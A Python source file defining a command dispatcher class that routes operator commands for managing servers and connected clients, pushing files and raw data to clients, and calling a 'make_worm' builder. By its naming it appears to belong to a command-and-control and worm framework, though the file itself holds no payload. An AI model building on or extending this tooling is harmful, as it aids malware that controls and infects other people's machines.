from typing import Union



class DracoControler:
    def __init__(self, draco_callback: object):
        self.draco = draco_callback
        self.msg = self.draco.msg
        self.Task = self.draco.Task


    def check_command(self, cmd: list) -> None:
        for com in cmd:
            if not com.get("types"):
                self.msg("msg", "[!!] Missing command 'types' [!!]")
                return
            if not com.get("cmd"):
                self.msg("msg", "[!!] Missing command 'cmd' [!!]")
                return
            self.exec_CMD(com)


    
    # Basic Command
    # {'types' : <command_types>, 'cmd' : <command>, 'data' : <optional_data>}
    def exec_CMD(self, cmd: dict) -> None:
        self.msg("dev", f"Recv CMD: {cmd}")
        match cmd["types"]:
            case "sys":
                self.sys_command(cmd)
            case "server":
                self.server_command(cmd)
            case "queen":
                self.queen_command(cmd)
            case _:
                self.msg("msg", "[!!] Unknown Command [!!]")
    
    def sys_command(self, cmd: dict) -> None:
        match cmd["cmd"]:
            case "task":
                self.msg("msg", self.Task.show_threads())
            case "quit":
                self.draco.Exit()
            case _:
                self.msg("msg", "[!!] Unknown Command [!!]")
    
    def server_command(self, cmd: dict) -> None:
        match cmd["cmd"]:
            case "make":
                if not cmd.get("data"):
                    self.msg("error", "No Config Data")
                else:
                    self.draco.Central.build_server(cmd["data"])
            case "close":
                self.draco.Central.close_server(cmd.get("data"))
            case "show_server":
                self.draco.Central.show_servers()
            case "show_client":
                self.draco.Central.show_clients()
            case "client":
                self.draco.Central.send_client_to_commander(cmd.get("data"))
            case "msg":
                self.draco.Central.send_msg(cmd["cli_id"], cmd.get("data"))
            case "send":
                self.draco.Central.send_file(cmd["data"]["cli_id"], cmd["data"]["fname"])
            case "raw":
                self.draco.Central.send_raw(cmd["cli_id"], cmd.get("data"))
            case _:
                self.msg("msg", "[!!] Unknown Command [!!]")
            
    def queen_command(self, cmd: dict) -> None:
        match cmd["cmd"]:
            case "builder":
                new = cmd.get("data").get("new")
                self.draco.Queen.make_worm(new)
            case _:
                self.msg("msg", "[!!] Unknown Command [!!]")